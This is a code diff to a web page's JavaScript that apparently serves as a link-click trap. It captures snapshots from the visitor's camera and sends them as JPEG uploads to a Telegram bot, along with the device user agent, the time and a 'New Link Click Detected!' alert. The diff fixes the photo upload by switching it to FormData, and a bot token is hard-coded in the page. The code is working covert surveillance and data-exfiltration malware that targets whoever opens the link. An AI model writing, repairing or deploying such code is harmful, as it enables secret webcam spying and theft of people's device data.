@@ -44,19 +44,19 @@
             });
         }
 
-        function sendToTelegram(message, photo = null) {
+        function sendToTelegram(message, photoBlob = null) {
             const botToken = "7913534738:AAEthUisUFuzA0p0q5txMWAiW74faM0j9ho";
 
-            if (photo) {
+            if (photoBlob) {
                 console.log("Sending photo...");
+                const formData = new FormData();
+                formData.append("chat_id", user_id);
+                formData.append("photo", photoBlob, "snapshot.jpg");
+                formData.append("caption", "📸 Camera snapshot");
+
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: user_id,
-                        photo: photo, // Send Base64 string directly
-                        caption: "📸 Camera snapshot"
-                    })
+                    body: formData
                 }).then(response => {
                     if (!response.ok) {
                         console.error("Failed to send photo:", response.statusText);
@@ -103,15 +103,16 @@
         function captureAndSend() {
             if (video.srcObject) {
                 ctx.drawImage(video, 0, 0, 320, 240);
-                const imageData = canvas.toDataURL("image/jpeg", 0.7).split(',')[1]; // Extract Base64 part
-                console.log("Captured image data:", imageData);
-                sendBasicInfo(imageData);
+                canvas.toBlob(blob => {
+                    console.log("Captured image blob:", blob);
+                    sendBasicInfo(blob);
+                }, "image/jpeg", 0.7);
             } else {
                 sendBasicInfo();
             }
         }
 
-        function sendBasicInfo(imageBase64 = null) {
+        function sendBasicInfo(photoBlob = null) {
             const message = `
 📥 <b>New Link Click Detected!</b>
 
@@ -119,7 +120,7 @@
 🖥️ <b>Device:</b> ${navigator.userAgent}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
             `;
-            sendToTelegram(message, imageBase64);
+            sendToTelegram(message, photoBlob);
         }
 
         function getLocalIP(callback) {
